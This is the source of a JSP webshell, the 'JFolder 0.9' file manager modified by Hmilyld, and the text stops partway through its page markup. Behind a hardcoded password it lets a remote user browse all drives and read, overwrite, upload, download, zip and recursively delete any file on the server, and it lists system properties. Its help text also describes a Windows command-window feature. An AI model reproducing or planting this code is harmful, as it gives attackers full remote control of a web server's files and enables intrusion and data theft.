<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.io.*,java.util.*,java.util.zip.*,java.text.*"%>
<%
	long startTime = System.currentTimeMillis();
	long startMem = Runtime.getRuntime().freeMemory();
	String uri = request.getRequestURI();
	String strThisFile = uri.substring(uri.lastIndexOf("/")+1);//本文件文件名
%>
<%!private final static int languageNo = 0; //语言版本，0 : 中文； 1：英文
	String password = "danmo";//登录密码
	String[] authorInfo = { "原作者:慈勤强 修改:Hmilyld", " " };
	String[] strFileManage = { "文 件 管 理", "File Management" };
	String[] strCommand = { "CMD 命 令", "Command Window" };
	String[] strSysProperty = { "系 统 属 性", "System Property" };
	String[] zipFolderProperty = { "目录打包下载", "This Folder ZIP" };
	String[] strHelp = { "帮 助", "Help" };
	String[] strParentFolder = { "上级目录", "Parent Folder" };
	String[] strCurrentFolder = { "当前目录", "Current Folder" };
	String[] strDrivers = { "盘符", "Drivers" };
	String[] strFileName = { "文件名称", "File Name" };
	String[] strFileSize = { "文件大小", "File Size" };
	String[] strLastModified = { "最后修改", "Last Modified" };
	String[] strFileOperation = { "文件操作", "Operations" };
	String[] strFileEdit = { "修改", "Edit" };
	String[] strFileDown = { "下载", "Download" };
	String[] strFileCopy = { "复制", "Move" };
	String[] strFileDel = { "删除", "Delete" };
	String[] strExecute = { "执行", "Execute" };
	String[] strBack = { "返回", "Back" };
	String[] strFileSave = { "保存", "Save" };
	String[] strCreateFile = { "新建文件", "Create File" };
	String[] strCreateFolder = { "新建目录", "Create Folder" };
	String[] strUpload = { "上传", "Upload" };
	String[] strDelFolder = {"删除目录","Del Folder"};

	public static class UploadMonitor {
		static Hashtable uploadTable = new Hashtable();
		static void set(String fName, UplInfo info) {
			uploadTable.put(fName, info);
		}
		static void remove(String fName) {
			uploadTable.remove(fName);
		}
		static UplInfo getInfo(String fName) {
			UplInfo info = (UplInfo) uploadTable.get(fName);
			return info;
		}
	}

	public class UplInfo {
		public long totalSize;
		public long currSize;
		public long starttime;
		public boolean aborted;
		public UplInfo() {
			totalSize = 0l;
			currSize = 0l;
			starttime = System.currentTimeMillis();
			aborted = false;
		}
		public UplInfo(int size) {
			totalSize = size;
			currSize = 0;
			starttime = System.currentTimeMillis();
			aborted = false;
		}
		public String getUprate() {
			long time = System.currentTimeMillis() - starttime;
			if (time != 0) {
				long uprate = currSize * 1000 / time;
				return convertFileSize(uprate) + "/s";
			} else
				return "n/a";
		}
		public int getPercent() {
			if (totalSize == 0)
				return 0;
			else
				return (int) (currSize * 100 / totalSize);
		}
		public String getTimeElapsed() {
			long time = (System.currentTimeMillis() - starttime) / 1000l;
			if (time - 60l >= 0) {
				if (time % 60 >= 10)
					return time / 60 + ":" + (time % 60) + "m";
				else
					return time / 60 + ":0" + (time % 60) + "m";
			} else
				return time < 10 ? "0" + time + "s" : time + "s";
		}
		public String getTimeEstimated() {
			if (currSize == 0)
				return "n/a";
			long time = System.currentTimeMillis() - starttime;
			time = totalSize * time / currSize;
			time /= 1000l;
			if (time - 60l >= 0) {
				if (time % 60 >= 10)
					return time / 60 + ":" + (time % 60) + "m";
				else
					return time / 60 + ":0" + (time % 60) + "m";
			} else
				return time < 10 ? "0" + time + "s" : time + "s";
		}
	}

	public class FileInfo {
		public String name = null, clientFileName = null,
				fileContentType = null;
		private byte[] fileContents = null;
		public File file = null;
		public StringBuffer sb = new StringBuffer(100);
		public void setFileContents(byte[] aByteArray) {
			fileContents = new byte[aByteArray.length];
			System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
		}
	}

	public class HttpMultiPartParser {
		private final int ONE_MB = 1024 * 1;
		public Hashtable processData(ServletInputStream is, String boundary,
				String saveInDir, int clength) throws IllegalArgumentException,
				IOException {
			if (is == null)
				throw new IllegalArgumentException("InputStream");
			if (boundary == null || boundary.trim().length() < 1)
				throw new IllegalArgumentException("\"" + boundary
						+ "\" is an illegal boundary indicator");
			boundary = "--" + boundary;
			StringTokenizer stLine = null, stFields = null;
			FileInfo fileInfo = null;
			Hashtable dataTable = new Hashtable(5);
			String line = null, field = null, paramName = null;
			boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
			boolean isFile = false;
			if (saveFiles) { // Create the required directory (including parent dirs)
				File f = new File(saveInDir);
				f.mkdirs();
			}
			line = getLine(is);
			if (line == null || !line.startsWith(boundary))
				throw new IOException("Boundary not found; boundary = "
						+ boundary + ", line = " + line);
			while (line != null) {
				if (line == null || !line.startsWith(boundary))
					return dataTable;
				line = getLine(is);
				if (line == null)
					return dataTable;
				stLine = new StringTokenizer(line, ";\r\n");
				if (stLine.countTokens() < 2)
					throw new IllegalArgumentException(
							"Bad data in second line");
				line = stLine.nextToken().toLowerCase();
				if (line.indexOf("form-data") < 0)
					throw new IllegalArgumentException(
							"Bad data in second line");
				stFields = new StringTokenizer(stLine.nextToken(), "=\"");
				if (stFields.countTokens() < 2)
					throw new IllegalArgumentException(
							"Bad data in second line");
				fileInfo = new FileInfo();
				stFields.nextToken();
				paramName = stFields.nextToken();
				isFile = false;
				if (stLine.hasMoreTokens()) {
					field = stLine.nextToken();
					stFields = new StringTokenizer(field, "=\"");
					if (stFields.countTokens() > 1) {
						if (stFields.nextToken().trim().equalsIgnoreCase(
								"filename")) {
							fileInfo.name = paramName;
							String value = stFields.nextToken();
							if (value != null && value.trim().length() > 0) {
								fileInfo.clientFileName = value;
								isFile = true;
							} else {
								line = getLine(is); // Skip "Content-Type:" line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Position to boundary line
								continue;
							}
						}
					} else if (field.toLowerCase().indexOf("filename") >= 0) {
						line = getLine(is); // Skip "Content-Type:" line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Position to boundary line
						continue;
					}
				}
				boolean skipBlankLine = true;
				if (isFile) {
					line = getLine(is);
					if (line == null)
						return dataTable;
					if (line.trim().length() < 1)
						skipBlankLine = false;
					else {
						stLine = new StringTokenizer(line, ": ");
						if (stLine.countTokens() < 2)
							throw new IllegalArgumentException(
									"Bad data in third line");
						stLine.nextToken(); // Content-Type
						fileInfo.fileContentType = stLine.nextToken();
					}
				}
				if (skipBlankLine) {
					line = getLine(is);
					if (line == null)
						return dataTable;
				}
				if (!isFile) {
					line = getLine(is);
					if (line == null)
						return dataTable;
					dataTable.put(paramName, line);
					// If parameter is dir, change saveInDir to dir
					if (paramName.equals("dir"))
						saveInDir = line;
					line = getLine(is);
					continue;
				}
				try {
					UplInfo uplInfo = new UplInfo(clength);
					UploadMonitor.set(fileInfo.clientFileName, uplInfo);
					OutputStream os = null;
					String path = null;
					if (saveFiles)
						os = new FileOutputStream(path = getFileName(saveInDir,
								fileInfo.clientFileName));
					else
						os = new ByteArrayOutputStream(ONE_MB);
					boolean readingContent = true;
					byte previousLine[] = new byte[2 * ONE_MB];
					byte temp[] = null;
					byte currentLine[] = new byte[2 * ONE_MB];
					int read, read3;
					if ((read = is.readLine(previousLine, 0,
							previousLine.length)) == -1) {
						line = null;
						break;
					}
					while (readingContent) {
						if ((read3 = is.readLine(currentLine, 0,
								currentLine.length)) == -1) {
							line = null;
							uplInfo.aborted = true;
							break;
						}
						if (compareBoundary(boundary, currentLine)) {
							os.write(previousLine, 0, read - 2);
							line = new String(currentLine, 0, read3);
							break;
						} else {
							os.write(previousLine, 0, read);
							uplInfo.currSize += read;
							temp = currentLine;
							currentLine = previousLine;
							previousLine = temp;
							read = read3;
						}//end else
					}//end while
					os.flush();
					os.close();
					if (!saveFiles) {
						ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
						fileInfo.setFileContents(baos.toByteArray());
					} else
						fileInfo.file = new File(path);
					dataTable.put(paramName, fileInfo);
					uplInfo.currSize = uplInfo.totalSize;
				}//end try
				catch (IOException e) {
					throw e;
				}
			}
			return dataTable;
		}

		private boolean compareBoundary(String boundary, byte ba[]) {
			if (boundary == null || ba == null)
				return false;
			for (int i = 0; i < boundary.length(); i++)
				if ((byte) boundary.charAt(i) != ba[i])
					return false;
			return true;
		}

		private synchronized String getLine(ServletInputStream sis)
				throws IOException {
			byte b[] = new byte[1024];
			int read = sis.readLine(b, 0, b.length), index;
			String line = null;
			if (read != -1) {
				line = new String(b, 0, read);
				if ((index = line.indexOf('\n')) >= 0)
					line = line.substring(0, index - 1);
			}
			return line;
		}

		public String getFileName(String dir, String fileName)
				throws IllegalArgumentException {
			String path = null;
			if (dir == null || fileName == null)
				throw new IllegalArgumentException("dir or fileName is null");
			int index = fileName.lastIndexOf('/');
			String name = null;
			if (index >= 0)
				name = fileName.substring(index + 1);
			else
				name = fileName;
			index = name.lastIndexOf('\\');
			if (index >= 0)
				fileName = name.substring(index + 1);
			path = dir + File.separator + fileName;
			if (File.separatorChar == '/')
				return path.replace('\\', File.separatorChar);
			else
				return path.replace('/', File.separatorChar);
		}
	}

	private String formatPath(String p) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < p.length(); i++) {
			if (p.charAt(i) == '\\') {
				sb.append("\\\\");
			} else {
				sb.append(p.charAt(i));
			}
		}
		return sb.toString();
	}

	private static String conv2Html(int i) {
		if (i == '&')
			return "&amp;";
		else if (i == '<')
			return "&lt;";
		else if (i == '>')
			return "&gt;";
		else if (i == '"')
			return "&quot;";
		else
			return "" + (char) i;
	}

	private static String htmlEncode(String st) {
		StringBuffer buf = new StringBuffer();
		for (int i = 0; i < st.length(); i++) {
			buf.append(conv2Html(st.charAt(i)));
		}
		return buf.toString();
	}

	String getDrivers() {
		StringBuffer sb = new StringBuffer(strDrivers[languageNo] + " : ");
		File roots[] = File.listRoots();
		for (int i = 0; i < roots.length; i++) {
			sb.append(" <a href=\"javascript:doForm('','" + roots[i]
					+ "\\','','','1','');\">");
			sb.append(roots[i] + "</a>&nbsp;");
		}
		return sb.toString();
	}

	static String convertFileSize(long filesize) {
		//bug 5.09M 显示5.9M
		String strUnit = "Bytes";
		String strAfterComma = "";
		int intDivisor = 1;
		if (filesize >= 1024 * 1024) {
			strUnit = "MB";
			intDivisor = 1024 * 1024;
		} else if (filesize >= 1024) {
			strUnit = "KB";
			intDivisor = 1024;
		}
		if (intDivisor == 1)
			return filesize + " " + strUnit;
		strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor;
		if (strAfterComma == "")
			strAfterComma = ".0";
		return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
	}
	
	static class ZipFolder {
		public static void zipDirectory(String dir, String zipfile)
				throws IOException, IllegalArgumentException {
			File d = new File(dir);
			if (!d.isDirectory()) {
				throw new IllegalArgumentException("错误,没有找到" + dir + "目录");
			}
			String[] entries = d.list();
			byte[] buffer = new byte[4096];
			int bytes_read;
			ZipOutputStream out = new ZipOutputStream(new FileOutputStream(
					zipfile));
			for (int i = 0; i < entries.length; i++) {
				File f = new File(d, entries[i]);
				if (f.isDirectory())
					continue;
				FileInputStream in = new FileInputStream(f);
				ZipEntry entry = new ZipEntry(f.getPath());
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1)
					out.write(buffer, 0, bytes_read);
				in.close();
			}
			out.close();
		}
	}
	static void delFolder(File dir){
		File filelist[]=dir.listFiles();  
	     int listlen=filelist.length;  
	     for(int i=0;i<listlen;i++){  
	        if(filelist[i].isDirectory()){  
	        	delFolder(filelist[i]);
	        }
	        else{  
	            filelist[i].delete();  
	       	}  
	     }
	   dir.delete();//删除当前目录  
	}
%>
<%
	request.setCharacterEncoding("gb2312");
	String tabID = request.getParameter("tabID");
	String strDir = request.getParameter("path");
	String strAction = request.getParameter("action");
	String strFile = request.getParameter("file");
	String strPath = strDir + "\\" + strFile;
	String strCmd = request.getParameter("cmd");
	StringBuffer sbEdit = new StringBuffer("");
	StringBuffer sbDown = new StringBuffer("");
	StringBuffer sbCopy = new StringBuffer("");
	StringBuffer sbSaveCopy = new StringBuffer("");
	StringBuffer sbNewFile = new StringBuffer("");
	StringBuffer sbZip = new StringBuffer("");
	StringBuffer sbDelFolder = new StringBuffer("");
	String user = (String) request.getSession().getAttribute("user");
	if (request.getParameter("password") != null
			&& request.getParameter("password").equals(password)) {
		request.getSession().setAttribute("user", "ok");
		response.sendRedirect(strThisFile);
	}
	if ((tabID == null) || tabID.equals("")) {
		tabID = "1";
	}
	if (strDir == null || strDir.length() < 1) {
		strDir = request.getSession().getServletContext().getRealPath(
				"/");
	}
	if (strAction != null && strAction.equals("down")) {
		File f = new File(strPath);
		if (f.length() == 0) {
			sbDown.append("文件大小为 0 字节，就不用下了吧");
		} else {
			response.setHeader("content-type",
					"text/html; charset=ISO-8859-1");
			response.setContentType("APPLICATION/OCTET-STREAM");
			response.setHeader("Content-Disposition",
					"attachment; filename=\"" + f.getName() + "\"");
			FileInputStream fileInputStream = new FileInputStream(f
					.getAbsolutePath());
			out.clearBuffer();
			int i;
			while ((i = fileInputStream.read()) != -1) {
				out.write(i);
			}
			fileInputStream.close();
			out.close();
		}
	}
	if (strAction != null && strAction.equals("del")) {
		File f = new File(strPath);
		f.delete();
	}
	if (strAction != null && strAction.equals("edit")) {
		File f = new File(strPath);
		BufferedReader br = new BufferedReader(new InputStreamReader(
				new FileInputStream(f)));
		sbEdit
				.append("<form name='frmEdit' action='' method='POST'>\r\n");
		sbEdit
				.append("<input type=hidden name=action value=save >\r\n");
		sbEdit.append("<input type=hidden name=path value='" + strDir
				+ "' >\r\n");
		sbEdit.append("<input type=hidden name=file value='" + strFile
				+ "' >\r\n");
		sbEdit.append("<input type=submit name=save value=' "
				+ strFileSave[languageNo] + " '> ");
		sbEdit.append("<input type=button name=goback value=' "
				+ strBack[languageNo]
				+ " ' onclick='history.back(-1);'> &nbsp;" + strPath
				+ "\r\n");
		sbEdit
				.append("<br><textarea rows=22 name=content style=\"font-size:12px;width:96%;\">");
		String line = "";
		while ((line = br.readLine()) != null) {
			sbEdit.append(htmlEncode(line) + "\r\n");
		}
		sbEdit.append("</textarea>");
		sbEdit.append("<input type=hidden name=path value=" + strDir
				+ ">");
		sbEdit.append("</form>");
	}
	if (strAction != null && strAction.equals("save")) {
		File f = new File(strPath);
		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
				new FileOutputStream(f)));
		String strContent = request.getParameter("content");
		bw.write(strContent);
		bw.close();
	}
	if (strAction != null && strAction.equals("copy")) {
		sbCopy
				.append("<br><form name='frmCopy' action='' method='POST'>\r\n");
		sbCopy
				.append("<input type=hidden name=action value=savecopy >\r\n");
		sbCopy.append("<input type=hidden name=path value='" + strDir
				+ "' >\r\n");
		sbCopy.append("<input type=hidden name=file value='" + strFile
				+ "' >\r\n");
		sbCopy.append("原始文件： " + strPath + "<p>");
		sbCopy
				.append("目标文件： <input type=text name=file2 size=40 value='"
						+ strDir + "'><p>");
		sbCopy.append("<input type=submit name=save value=' "
				+ strFileCopy[languageNo] + " '> ");
		sbCopy.append("<input type=button name=goback value=' "
				+ strBack[languageNo]
				+ " ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
		sbCopy.append("</form>");
	}
	if (strAction != null && strAction.equals("savecopy")) {
		File f = new File(strPath);
		String strDesFile = request.getParameter("file2");
		if (strDesFile == null || strDesFile.equals("")) {
			sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");
		} else {
			File f_des = new File(strDesFile);
			if (f_des.isFile()) {
				sbSaveCopy
						.append("<p><font color=red>目标文件已存在,不能复制。</font>");
			} else {
				String strTmpFile = strDesFile;
				if (f_des.isDirectory()) {
					if (!strDesFile.endsWith("\\")) {
						strDesFile = strDesFile + "\\";
					}
					strTmpFile = strDesFile + "cqq_" + strFile;
				}
				File f_des_copy = new File(strTmpFile);
				FileInputStream in1 = new FileInputStream(f);
				FileOutputStream out1 = new FileOutputStream(f_des_copy);
				byte[] buffer = new byte[1024];
				int c;
				while ((c = in1.read(buffer)) != -1) {
					out1.write(buffer, 0, c);
				}
				in1.close();
				out1.close();
				sbSaveCopy.append("原始文件 ：" + strPath + "<p>");
				sbSaveCopy.append("目标文件 ：" + strTmpFile + "<p>");
				sbSaveCopy.append("<font color=red>复制成功！</font>");
			}
		}
		sbSaveCopy
				.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>");
	}
	if (strAction != null && strAction.equals("newFile")) {
		String strF = request.getParameter("fileName");
		String strType1 = request.getParameter("btnNewFile");
		String strType2 = request.getParameter("btnNewDir");
		String strType = "";
		if (strType1 == null) {
			strType = "Dir";
		} else if (strType2 == null) {
			strType = "File";
		}
		if (!strType.equals("") && !(strF == null || strF.equals(""))) {
			File f_new = new File(strF);
			if (strType.equals("File") && !f_new.createNewFile())
				sbNewFile.append(strF + " 文件创建成功");
			if (strType.equals("Dir") && !f_new.mkdirs())
				sbNewFile.append(strF + " 目录创建成功");
		} else {
			sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
		}
	}
	if (null!=strAction && "delFolder".equals(strAction)){
		 String folder = request.getParameter("path");
		 File dir = new File(folder);
		 delFolder(dir);
		 sbDelFolder.append("目录删除成功");
	}
	if (null != strAction && "zipFolder".equals(strAction)) {
		String inFolder = request.getParameter("path");
		String outFolder = request.getParameter("file");
		ZipFolder.zipDirectory(inFolder, outFolder);
		sbZip.append("<p>目录压缩成功,压缩文件路径为:" + outFolder + "</p>");
	}
	if ((request.getContentType() != null)
			&& (request.getContentType().toLowerCase()
					.startsWith("multipart"))) {
		String tempdir = ".";
		response.setContentType("text/html");
		sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
		HttpMultiPartParser parser = new HttpMultiPartParser();
		int bstart = request.getContentType().lastIndexOf("oundary=");
		String bound = request.getContentType().substring(bstart + 8);
		int clength = request.getContentLength();
		Hashtable ht = parser.processData(request.getInputStream(),
				bound, tempdir, clength);
		if (ht.get("cqqUploadFile") != null) {
			FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
			File f1 = fi.file;
			UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
			if (info != null && info.aborted) {
				f1.delete();
				request.setAttribute("error", "Upload aborted");
			} else {
				String path = (String) ht.get("path");
				if (path != null && !path.endsWith("\\"))
					path = path + "\\";
				if (!f1.renameTo(new File(path + f1.getName()))) {
					request
							.setAttribute("error",
									"Cannot upload file.");
					f1.delete();
				}
			}
		}
	}
%>
<html>
	<head>
		<title>JFoler 0.9 By Hmilyld修改版</title>
		<style type="text/css">
td,select,input,body {
	font-size: 9pt;
}
.form1 {
	display: inline;
	margin: 0px;
}
A {
	TEXT-DECORATION: none
}
#tablist {
	padding: 5px 0;
	margin: 1px 0 2px 0;
	font: 9pt;
}
#tablist li {
	list-style: none;
	display: inline;
	margin: 0px;
}
#tablist li a {
	padding: 3px 0.5em;
	margin-left: 3px;
	border: 1px solid;
	background: F6F6F6;
}
#tablist li a:link,#tablist li a:visited {
	color: navy;
}
#tablist li a.current {
	background: #EAEAFF;
}
#tabcontentcontainer {
	width: 100%;
	padding: 5px;
	border: 1px solid black;
}
.tabcontent {
	display: none;
}
</style>
<%if (user != null) {%>
<script type="text/javascript">
var initialtab=[<%=tabID%>, "menu<%=tabID%>"]
function cascadedstyle(el, cssproperty, csspropertyNS){
if (el.currentStyle)
return el.currentStyle[cssproperty]
else if (window.getComputedStyle){
var elstyle=window.getComputedStyle(el, "")
return elstyle.getPropertyValue(csspropertyNS)
}
}
var previoustab=""
function expandcontent(cid, aobject){
if (document.getElementById){
highlighttab(aobject)
if (previoustab!="")
document.getElementById(previoustab).style.display="none"
document.getElementById(cid).style.display="block"
previoustab=cid
if (aobject.blur)
aobject.blur()
return false
}
else
return true
}
function highlighttab(aobject){
if (typeof tabobjlinks=="undefined")
collecttablinks()
for (i=0; i<tabobjlinks.length; i++)
tabobjlinks[i].style.backgroundColor=initTabcolor
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
}
function collecttablinks(){
var tabobj=document.getElementById("tablist")
tabobjlinks=tabobj.getElementsByTagName("A")
}
function do_onload(){
collecttablinks()
initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
}
if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload
</script>
<script language="javascript">
function doForm(action,path,file,cmd,tab,content)
{
	document.frmCqq.action.value=action;
	document.frmCqq.path.value=path;
	document.frmCqq.file.value=file;
	document.frmCqq.cmd.value=cmd;
	document.frmCqq.tabID.value=tab;
	document.frmCqq.content.value=content;
	if(action=="del"){
		if(confirm("确定要删除文件 "+file+" 吗？"))
		document.frmCqq.submit();
	}else{
		if(action=="delFolder"){
			if(confirm("确定要删除目录 "+path+" 吗？\n"+"删除该目录,则该目录下文件一并删除"))
			document.frmCqq.submit();
		}else{
			document.frmCqq.submit();
		}
	}
}
</script>
<%}%>
</head>
	<body>
		<%if (user == null) {%>
		<form action="" method="post">
			<table align="center">
				<tr>
					<td>登录密码:</td>
					<td><input type="password" name="password" /></td>
				</tr>
				<tr>
					<td colspan="2" align="center">
						<input type="submit" value="登录" />
					</td>
				</tr>
			</table>
		</form>
		<%
			} else {
		%>
		<form name="frmCqq" method="post" action="">
		  <input type="hidden" name="action" value="">
		  <input type="hidden" name="path" value="">
		  <input type="hidden" name="file" value="">
		  <input type="hidden" name="cmd" value="">
		  <input type="hidden" name="tabID" value="2">
		  <input type="hidden" name="content" value="">
		</form>
		<!--Top Menu Started-->
		<ul id="tablist">
			<li>
				<a href="http://www.whylover.com" class="current"
					onClick="return expandcontent('menu1', this)"><%=strFileManage[languageNo]%></a>
			</li>
			<li>
				<a href="http://www.whylover.com"
					onClick="return expandcontent('menu2', this)"><%=strCommand[languageNo]%></a>
			</li>
			<li>
				<a href="http://www.whylover.com"
					onClick="return expandcontent('menu3', this)"><%=strSysProperty[languageNo]%></a>
			</li>
			<li>
				<a href="http://www.whylover.com"
					onClick="return expandcontent('menu4', this)"><%=strHelp[languageNo]%></a>
			</li>
		</ul>
		<!--Top Menu End-->
		<%
			StringBuffer sbFolder = new StringBuffer("");
			StringBuffer sbFile = new StringBuffer("");
				try {
					File objFile = new File(strDir);
					if(!objFile.exists()){
						strDir = strDir.substring(0,strDir.lastIndexOf("\\"));
						objFile = new File(strDir);
					}
					File list[] = objFile.listFiles();
					if (objFile.getAbsolutePath().length() > 3) {
						sbFolder
								.append("<tr><td ></td><td><a href=\"javascript:doForm('','");
						sbFolder.append(formatPath(objFile.getParentFile()
								.getAbsolutePath()));
						sbFolder.append("','','" + strCmd + "','1','');\">");
						sbFolder.append(strParentFolder[languageNo]);
						sbFolder.append("</a>");
						sbFolder.append(" <a href=\"javascript:doForm('zipFolder','");
						sbFolder.append(formatPath(strDir));
						sbFolder.append("','"+formatPath(strDir)+"\\\\hZipFile.zip','" + strCmd + "','1','');\">");
						sbFolder.append(zipFolderProperty[languageNo]);
						sbFolder.append("</a>");
						sbFolder.append("<br>");
						sbFolder.append("- - - - - - - - - - - </td></tr>\r\n");
					}
					for (int i = 0; i < list.length; i++) {
						if (list[i].isDirectory()) {
							sbFolder.append("<tr><td >&nbsp;</td><td>");
							sbFolder.append("<a href=\"javascript:doForm('','");
							sbFolder.append(formatPath(list[i]
									.getAbsolutePath()));
							sbFolder
									.append("','','" + strCmd + "','1','');\">");
							sbFolder.append(list[i].getName()+ "</a>");
							sbFolder.append(" <a href=\"javascript:doForm('delFolder','");
							sbFolder.append(formatPath(list[i]
									.getAbsolutePath()));
							sbFolder
									.append("','','" + strCmd + "','1','');\">");
							sbFolder.append(strDelFolder[languageNo]+ "</a>");
							sbFolder.append("<br></td></tr> ");
						} else {
							String strLen = "";
							String strDT = "";
							long lFile = 0;
							lFile = list[i].length();
							strLen = convertFileSize(lFile);
							java.util.Date dt = new java.util.Date(list[i]
									.lastModified());
							SimpleDateFormat dd = new SimpleDateFormat(
									"yyyy-MM-dd hh:mm:ss");
							strDT = dd.format(dt);
							sbFile
									.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
							sbFile.append("" + list[i].getName());
							sbFile.append("</td><td>");
							sbFile.append("" + strLen);
							sbFile.append("</td><td>");
							sbFile.append("" + strDT);
							sbFile.append("</td><td>");
							for (int temp = 0; temp < 4; temp++) {
								String action;
								String actionName;
								if (temp == 0) {
									action = "edit";
									actionName = strFileEdit[languageNo];
								} else if (temp == 1) {
									action = "del";
									actionName = strFileDel[languageNo];
								} else if (temp == 2) {
									action = "down";
									actionName = strFileDown[languageNo];
								} else {
									action = "copy";
									actionName = strFileCopy[languageNo];
								}
								;
								sbFile
										.append("&nbsp;<a href=\"javascript:doForm('"
												+ action + "','");
								sbFile.append(formatPath(strDir) + "','");
								sbFile.append(list[i].getName());
								sbFile.append("','" + strCmd + "','" + tabID
										+ "','');\">");
								sbFile.append(actionName + "</a>");
							}
							sbFile.append("</td></tr>");
						}

					}
				} catch (Exception e) {
					out.println("<font color=red>操作失败： " + e.toString()
							+ "</font>");
				}
		%>
		<DIV id="tabcontentcontainer">
			<div id="menu3" class="tabcontent">
				<%
					Properties prop = new Properties(System.getProperties());
				%>
				<ol>
					<li>JVM版本号:<%=prop.getProperty("java.vm.version")%></li>
					<li>JAVA安装目录:<%=prop.getProperty("java.home")%></li>
					<li>JAVA类路径:<%=prop.getProperty("java.class.path")%></li>
					<li>用户所属国家:<%=prop.getProperty("user.country")%></li>
					<li>操作系统:<%=prop.getProperty("os.name")%></li>
					<li>字符集:<%=prop.getProperty("sun.jnu.encoding")%></li>
					<li>当前文件绝对路径:<%=application.getRealPath(strThisFile)%></li>
					<li>当前文件URL路径:<%=request.getRequestURL().toString()%></li>
					<li>用户当前工作目录:<%=prop.getProperty("user.dir")%></li>
					<li>用户主目录:<%=prop.getProperty("user.home")%></li>
					<li>用户账户名称:<%=prop.getProperty("user.name")%></li>
					<li>内存使用情况:
						<ul>
							<%
								long endMem = Runtime.getRuntime().freeMemory();
									long total = Runtime.getRuntime().maxMemory();
									out.println("<li>Total Memory:" + total + "</li>");
									out.println("<li>Start Memory:" + startMem + "</li>");
									out.println("<li>End Memory:" + endMem + "</li>");
									out.println("<li>Use memory: " + (startMem - endMem) + "</li>");
									long endTime = System.currentTimeMillis();
									out.println("<li>Use Time: " + (endTime - startTime) + "</li>");
							%>
						</ul>
					</li>
				</ol>
			</div>
			<div id="menu4" class="tabcontent">
				<ul>
					<li>功能说明</li>
						<ol>
							<li>jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、删除、下载文件和目录。</li>
							<li>对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似与windows的cmd。</li>
						</ol>
					<li>版权说明</li>
						<ol>
							<li>本程序版权归原作者所有,Hmilyld仅对程序局部修改</li>
							<li>联系Hmilyld:<a href="http://www.hmilyld.cn" target="_blank">http://www.hmilyld.cn</a> <a href="http://www.whylover.com" target="_blank">http://www.whylover.com</a></li>
						</ol>
					<li>更新记录</li>
						<ol>
							<li>2008.05.16&nbsp;删除循环获取系统相关属性功能,原因见bug - Hmilyld</li>
							<li>2008.05.16&nbsp;增加对指定目录跳转功能,修改需在文件中指定文件名的操作,自动获取 - Hmilyld</li>
							<li>2008.05.15&nbsp;增加对浏览目录指定打包功能,增加删除目录功能 - Hmilyld</li>
							<li>2007.12.27&nbsp;增加登录验证功能 - Hmilyld</li>
							<li>2007.12.26&nbsp;修改程序部分不推荐使用的方法,增加系统基本属性查看功能,部分代码重写 - Hmilyld</li>
							<li>2004.11.15&nbsp;V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</li>
							<li>2004.10.27&nbsp;暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</li>
							<li>2004.09.20&nbsp;第一个jsp程序就是这个简单的显示目录文件的小程序</li>
						</ol>
					<li>Bug说明</li>
						<ol>
							<li>当上传文件时,如文件所在项目中使用到Struts相关jar包,会出现异常情况</li>
							<li>循环列举出系统相关属性时,会抛出异常,此功能已删除(原因不详,在一些机器上会出现,但本机测试无问题),如需加上,相关代码如下:</li>
							<blockquote>
								&lt;%<br />
								Properties props=System.getProperties();<br />
								Iterator iter=props.keySet().iterator();<br />
								while(iter.hasNext())<br />
								{<br />
								String key=(String)iter.next();<br />
								%&gt;<br /> 
								&lt;li&gt;&lt;%=key%&gt;:&lt;%=props.get(key)%&gt;&lt;/li&gt;<br />
								&lt;%}
								%&gt;
							</blockquote>
						</ol>
				</ul>
			</div>
			<div id="menu1" class="tabcontent">
			<form action="" method="post">
			<input type="hidden" name="action" value="goPath">
			<input type="hidden" name="file" value="<%=strFile%>">
			<input type="hidden" name="cmd" value="<%=strCmd%>">
			<input type="hidden" name="tabID" value="1">
			<input type="hidden" name="content" value="">
				<table border='1' width='100%' bgcolor='#B1CCEA' cellspacing=0
					cellpadding=5>
					<tr>
						<td width='60%'><%=strCurrentFolder[languageNo]%>:
							<input type="text" value="<%=strDir%>" name="path" style="width:450px;">
							<input type="submit" value="转到">
						</td>
						<td><%=getDrivers()%></td>
					</tr>
				</table>
			</form>
				<table width="100%" border="1" cellspacing="0" cellpadding="5">
					<tr>
						<td width="25%" align="center" valign="top">
							<table width="98%" border="0" cellspacing="0" cellpadding="3">
								<%=sbFolder%>
							</table>
						</td>
						<td width="81%" align="left" valign="top">
							<table width="98%" border="1" cellspacing="1" cellpadding="4"
								bgcolor="#ffffff">
								<tr bgcolor="#E7e7e6">
									<td colspan="4"><%
								if (strAction != null && strAction.equals("edit")) {
